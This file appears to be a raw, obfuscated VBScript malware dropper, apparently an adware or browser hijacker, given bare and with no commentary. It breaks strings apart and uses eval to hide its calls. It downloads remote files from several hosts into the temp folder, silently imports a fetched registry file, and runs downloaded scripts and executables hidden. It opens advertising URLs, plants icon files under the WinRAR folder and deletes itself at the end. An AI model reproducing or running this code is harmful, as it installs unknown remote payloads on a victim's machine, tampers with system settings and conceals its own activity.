on error resume next
a513m6e4="http://p5.ch"&"ina.sog"&"ou.google.baid"&"u.com.ba"&"idu163s"&"o.info"
d8spua90="http://98.126.249.6:81"
fj58324k="http://hao345.info:7241"
Set bj79k7n3= WScript.CreateObject("WScr"&"ipt.Sh"&"ell") 
Set m16427649 = Wscript.CreateObject("Script"&"ing.FileSystemO"&"bject") 
cy2ruxck=bj79k7n3.ExpandEnvironmentStrings("%temp%")
w8gkt0s1 = left(cy2ruxck,3)
bj79k7n3.Run("htt"&"p://w"&"ww.xs"&"p5.i"&"nfo/index8.htm")
bj79k7n3.run "C:\Progra~1\Intern~1\IEXPLORE.EXE http://ww"&"w.xs"&"p5.info/index/index8.htm",0 

Sub c192na43n(t1zy98k42)
Set e4dqheby= CreateObject("scrip"&"ting.Fi"&"leSys"&"temObject") 
If Not e4dqheby.FolderExists(t1zy98k42) Then
  e4dqheby.CreateFolder t1zy98k42
End If
Set e4dqheby = Nothing 
end sub

Call c192na43n(w8gkt0s1&"Prog"&"ra~1\Win"&"RAR\ico")
ico1=w8gkt0s1&"Prog"&"ra~1\WinR"&"AR\ico\"

Sub g0wh9kza(q13f2e151,w13552gx6)
Set j18337xp6 = CreateObject("M"&"icros"&"oft.XM"&"L"&"HT"&"TP")
Set k1772salh = CreateObject("AD"&"O"&"DB.S"&"t"&"r"&"e"&"a"&"m")
with j18337xp6
.Open "GET",q13f2e151,0
.Send()
end with
b=j18337xp6.responseBody
with k1772salh
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("j18337xp6.r"&"es"&"po"&"n"&"se"&"Bo"&"d"&"y")
.SaveToFile w13552gx6,eval ("2")
end with
k1772salh.close
end sub

call g0wh9kza(a513m6e4&"/ico/tb.ico",ico1&"tb.ico")
for i=1 to 6
call g0wh9kza(a513m6e4&"/ico/"+cstr(i)+".ico",w8gkt0s1&"Progra~1\WinRAR\ico\"+cstr(i)+".ico")
next

call g0wh9kza(a513m6e4&"/go/ie.txt",cy2ruxck&"\ie.reg")
bj79k7n3.Run "regedit /s "&cy2ruxck&"\ie.reg"

call g0wh9kza(d8spua90&"/hao.txt",cy2ruxck&"\xing.vbs")
bj79k7n3.Run "cmd.exe /c start "&cy2ruxck&"\xing.vbs",0,True
bj79k7n3.Run "http://www.19885.info/?gg"

call g0wh9kza(a513m6e4&"/go/page.txt",cy2ruxck&"\page.vbs")
bj79k7n3.Run "cmd.exe /c start "&cy2ruxck&"\page.vbs",0,True
bj79k7n3.Run "http://www.19887.info/?gg"

call g0wh9kza(a513m6e4&"/dy/bbtbb.html",cy2ruxck&"\bbtbb.exe")
bj79k7n3.Run "cmd.exe /c start "&cy2ruxck&"\bbtbb.exe",0,True
bj79k7n3.Run "h"&"ttp://www.198"&"56.info/?gg"

call g0wh9kza(fj58324k&"/soft/uaua4397.exe",cy2ruxck&"\uaua4397.exe")
bj79k7n3.Run "cmd.exe /c start "&cy2ruxck&"\uaua4397.exe",0,True

call g0wh9kza(fj58324k&"/soft/uaua4397.exe",cy2ruxck&"\gou4397.exe")
bj79k7n3.Run "cmd.exe /c start "&cy2ruxck&"\gou4397.exe",0,True
bj79k7n3.Run "htt"&"p://www.19"&"858.in"&"fo/?gg"

call g0wh9kza(a513m6e4&"/go/goto.txt",cy2ruxck&"\goto.vbs")
bj79k7n3.Run "cmd.exe /c start "&cy2ruxck&"\goto.vbs",0,True
m16427649.DeleteFile(WScript.ScriptName)
